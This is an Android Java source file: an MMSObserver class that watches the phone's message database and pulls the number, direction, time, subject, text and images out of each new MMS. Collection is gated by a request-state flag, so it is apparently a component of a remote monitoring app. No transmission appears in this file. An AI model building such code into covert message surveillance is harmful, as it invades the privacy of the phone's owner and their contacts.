package com.inet.android.sms;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.Telephony;
import android.util.Log;

import com.inet.android.request.ConstantValue;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.inet.android.utils.ValueWork;

public class MMSObserver extends ContentObserver {
	private static final String LOG_TAG = MMSObserver.class.getSimpleName()
			.toString();
	private static final Uri mmsURI = Uri.parse("content://mms/");
	private static Context ctx;
	// private static long currentId = 0;
	int mmsCount = 0;
	private boolean payload = false;
	private int payloadSize = -1;

	public MMSObserver(Handler handler) {
		super(handler);
	}

	public MMSObserver(Handler handler, Context ctx) {
		super(handler);
		MMSObserver.ctx = ctx;
	}

	public boolean deliverSelfNotifications() {
		return true;
	}

	public void startMMSMonitoring() {
		final String[] projection = new String[] { "*" };
		Cursor mmsCur = ctx.getContentResolver().query(
				Telephony.Mms.CONTENT_URI, projection,
				"msg_box = 1 or msg_box = 2", null, "_id");
		if (mmsCur != null && mmsCur.getCount() > 0) {
			mmsCount = mmsCur.getCount();
			Logging.doLog(LOG_TAG, "MMSMonitor :: Init MMSCount == " + mmsCount);
		}
		Cursor mmsCur2 = ctx.getContentResolver().query(
				Telephony.Mms.CONTENT_URI, projection, "msg_box = 1", null,
				"_id");
		if (mmsCur2 != null && mmsCur2.getCount() > 0) {
			int mmsCount2 = mmsCur2.getCount();
			Logging.doLog(LOG_TAG,
					"MMSMonitor :: Init MMSCount 'msg_box = 1' == " + mmsCount2);
		}
		Cursor mmsCur22 = ctx.getContentResolver().query(
				Telephony.Mms.CONTENT_URI, projection, "msg_box = 2", null,
				"_id");
		if (mmsCur22 != null && mmsCur22.getCount() > 0) {
			int mmsCount22 = mmsCur22.getCount();
			Logging.doLog(LOG_TAG,
					"MMSMonitor :: Init MMSCount 'msg_box = 2' == "
							+ mmsCount22);
		}
		Cursor mmsCur3 = ctx.getContentResolver().query(
				Telephony.Mms.CONTENT_URI, projection, "msg_box = 3", null,
				"_id");
		if (mmsCur3 != null && mmsCur3.getCount() > 0) {
			int mmsCount3 = mmsCur3.getCount();
			// mmsCount += mmsCount3;
			Logging.doLog(LOG_TAG,
					"MMSMonitor :: Init MMSCount 'msg_box = 3' == " + mmsCount3);
		}
		Logging.doLog(LOG_TAG, "MMSMonitor :: Init All MMS Count == "
				+ mmsCount);
		mmsCur.close();
		mmsCur2.close();
		mmsCur3.close();
	}

	@Override
	public void onChange(boolean selfChange) {
		this.onChange(selfChange, null);
	}

	@Override
	public void onChange(boolean selfChange, Uri uri) {
		Logging.doLog(LOG_TAG, "onChange");
		// Logging.doLog(TAG, "uri: " + uri.toString());
		if (ValueWork.getState(ConstantValue.TYPE_INCOMING_SMS_REQUEST, ctx) == 0)
			return;
		byte[] imgData = null; // изображение mms
		String mmsText = ""; // текст mms
		String mmsDirection = ""; // направление mms
		String mmsNumber = ""; // номер отправителя mms
		String mmsTime = ""; // время принятия/отправки mms
		String mmsSubject = ""; // заголовок mms

		String[] projection = new String[] { "*" };
		Uri uriuri = Uri.parse("content://mms-sms/conversations?simple=true");

		Cursor query = ctx.getContentResolver().query(uriuri, projection, null,
				null, null);
		query.moveToFirst();

		// Определение sms или mms
		if (query.moveToFirst()) {
			String string = query.getString(query
					.getColumnIndex("transport_type"));
			String id = query.getString(query.getColumnIndex("_id"));
			if ("mms".equals(string)) {
				Logging.doLog(LOG_TAG, "It's mms. Conversation id = " + id);

				mmsNumber = query.getString(query
						.getColumnIndex("recipient_address"));
			} else {
				Logging.doLog(LOG_TAG, "It's sms. Return.");
				return;
			}
		}
		query.close();

		Cursor mmsCursor = ctx.getContentResolver()
				.query(mmsURI, new String[] { "*" },
						"msg_box = 1 or msg_box = 2", null, "_id");
		int currentMMSCount = 0;

		Logging.doLog(LOG_TAG, "1 mmsCursor.getCount: " + mmsCursor.getCount());
		Logging.doLog(LOG_TAG, "1 currMMScount: " + currentMMSCount);
		Logging.doLog(LOG_TAG, "1 mmsCount: " + mmsCount);

		if (mmsCursor != null && mmsCursor.getCount() > 0) {
			currentMMSCount = mmsCursor.getCount();
		}

		Logging.doLog(LOG_TAG, "2 mmsCursor.getCount: " + mmsCursor.getCount());
		Logging.doLog(LOG_TAG, "2 currMMScount: " + currentMMSCount);
		Logging.doLog(LOG_TAG, "2 mmsCount: " + mmsCount);

		if (currentMMSCount > mmsCount) {
			mmsCount = currentMMSCount;

			if (mmsCursor.moveToLast()) {
				long id = Integer.parseInt(mmsCursor.getString(mmsCursor
						.getColumnIndex("_id")));
				Logging.doLog(LOG_TAG, "mms _id: " + id);

				int msg_box = Integer.parseInt(mmsCursor.getString(mmsCursor
						.getColumnIndex("msg_box")));
				Log.w(LOG_TAG, "msg_box: " + msg_box);

				// status
				String mmsStatus = mmsCursor.getString(mmsCursor
						.getColumnIndex("st"));
				Log.d(LOG_TAG, "status: " + mmsStatus);

				mmsSubject = mmsCursor.getString(mmsCursor
						.getColumnIndex("sub"));
				Logging.doLog(LOG_TAG, "subject: " + mmsSubject);

				mmsTime = ConvertDate.getDate(System.currentTimeMillis());
				Log.w(LOG_TAG, "time: " + mmsTime);

				int type = Integer.parseInt(mmsCursor.getString(mmsCursor
						.getColumnIndex("m_type")));
				if (type == 128) {
					mmsDirection = "0";
					Logging.doLog(LOG_TAG, "outgoing mms " + type);
					Log.w(LOG_TAG, "direction: " + mmsDirection);
				} else {
					mmsDirection = "1";
					Logging.doLog(LOG_TAG, "incoming mms " + type);
					Log.w(LOG_TAG, "direction: " + mmsDirection);
				}

				// Get Parts
				Uri uriMMSPart = Uri.parse("content://mms/part");
				Cursor curPart = ctx.getContentResolver().query(uriMMSPart,
						new String[] { "*" }, "mid = " + id, null, "_id");
				Logging.doLog(LOG_TAG,
						"parts records length == " + curPart.getCount());

				curPart.moveToLast();

				do {
					if (curPart.getCount() == 0) {
						Logging.doLog(LOG_TAG, "break curPart");
						return;
					}
					String partId = curPart.getString(curPart
							.getColumnIndex("_id"));
					String contentType = curPart.getString(curPart
							.getColumnIndex("ct"));

					Logging.doLog(LOG_TAG, "id == " + id);
					Logging.doLog(LOG_TAG, "partId == " + partId);
					Logging.doLog(LOG_TAG, "part mime type == " + contentType);

					// Get the message
					if (contentType.equalsIgnoreCase("text/plain")) {
						Logging.doLog(LOG_TAG,
								" ==== Get the message start ====");

						Cursor curPart1 = ctx.getContentResolver().query(
								uriMMSPart, new String[] { "*" },
								"mid = " + id + " and _id =" + partId, null,
								"_id");
						Logging.doLog(LOG_TAG, "parts records length == "
								+ curPart1.getCount());
						Logging.doLog(LOG_TAG, "uri curPart1: " + uriMMSPart);

						curPart1.moveToLast();

						String data = curPart1.getString(15);
						if (data != null) {
							mmsText = getMmsText(partId);
						} else {
							mmsText = curPart1.getString(curPart1
									.getColumnIndex("text"));
						}

						Logging.doLog(LOG_TAG, "Txt Message == " + mmsText);
					}

					// Get Image
					else if (isImageType(contentType) == true) {
						Logging.doLog(LOG_TAG, " ==== Get the Image start ====");
						imgData = readMMSPart(partId);
						if (payload) {
							payloadSize = imgData.length;
						}
						Logging.doLog(LOG_TAG, "image data length == "
								+ imgData.length);
					}
				} while (curPart.moveToPrevious());
			}

			Logging.doLog(LOG_TAG, "**Mms number: " + mmsNumber);
			Logging.doLog(LOG_TAG, "**Mms direction: " + mmsDirection);
			Logging.doLog(LOG_TAG, "**Mms time: " + mmsTime);
			Logging.doLog(LOG_TAG, "**Mms subject: " + mmsSubject);
			Logging.doLog(LOG_TAG, "**Mms text: " + mmsText);
			if (payloadSize >= 0) {
				Logging.doLog(LOG_TAG, "**Mms image size: " + payloadSize);
			} else {
				Logging.doLog(LOG_TAG, "**Mms no payload");
			}
			payload = false;
		}
		mmsCount = mmsCursor.getCount();
		payloadSize = -1;
		mmsCursor.close();
	}

	private String getMmsText(String id) {
		Uri partURI = Uri.parse("content://mms/part/" + id);
		InputStream is = null;
		StringBuilder sb = new StringBuilder();
		try {
			is = ctx.getContentResolver().openInputStream(partURI);
			if (is != null) {
				InputStreamReader isr = new InputStreamReader(is, "UTF-8");
				BufferedReader reader = new BufferedReader(isr);
				String temp = reader.readLine();
				while (temp != null) {
					sb.append(temp);
					temp = reader.readLine();
				}
			}
		} catch (IOException e) {
		} finally {
			if (is != null) {
				try {
					is.close();
				} catch (IOException e) {
				}
			}
		}
		return sb.toString();
	}

	private byte[] readMMSPart(String partId) {
		byte[] partData = null;
		Uri partURI = Uri.parse("content://mms/part/" + partId);
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		InputStream is = null;

		try {

			Logging.doLog(LOG_TAG,
					"Entered into readMMSPart try..." + partURI.toString());

			is = ctx.getContentResolver().openInputStream(partURI);

			byte[] buffer = new byte[256];
			int len = -1;
			if (is != null) {
				len = is.read(buffer);
				payload = true;
			} else {
				Logging.doLog(LOG_TAG, "is equal null");
				payload = false;
			}
			while (len >= 0) {
				baos.write(buffer, 0, len);
				len = is.read(buffer);
			}
			partData = baos.toByteArray();
			// Log.i("", "Text Msg :: " + new String(partData));

		} catch (IOException e) {
			Logging.doLog(LOG_TAG, "Exception == Failed to load part data");
		} finally {
			if (is != null) {
				try {
					is.close();
				} catch (IOException e) {
					Logging.doLog(LOG_TAG,
							"Exception :: Failed to close stream");
				}
			}
		}
		return partData;
	}
	public void setContext(Context context) {
		this.ctx = context;
	}
	private boolean isImageType(String mime) {
		boolean result = false;
		if (mime.equalsIgnoreCase("image/jpg")
				|| mime.equalsIgnoreCase("image/jpeg")
				|| mime.equalsIgnoreCase("image/png")
				|| mime.equalsIgnoreCase("image/gif")
				|| mime.equalsIgnoreCase("image/bmp")
				|| mime.equalsIgnoreCase("application/smil")) {
			result = true;
		}
		return result;
	}

	public static void regMMSObserver(Context mContext) {
		MMSObserver mmsObserver = null;
		Logging.doLog(LOG_TAG, "register mmsObserver");
		if (mmsObserver == null) {
			mmsObserver = new MMSObserver(null);
			mmsObserver.setContext(mContext);
			mContext.getContentResolver().registerContentObserver(
					Uri.parse("content://mms-sms/conversations/"), true,
					mmsObserver);
			mmsObserver.startMMSMonitoring();
		}
	}
}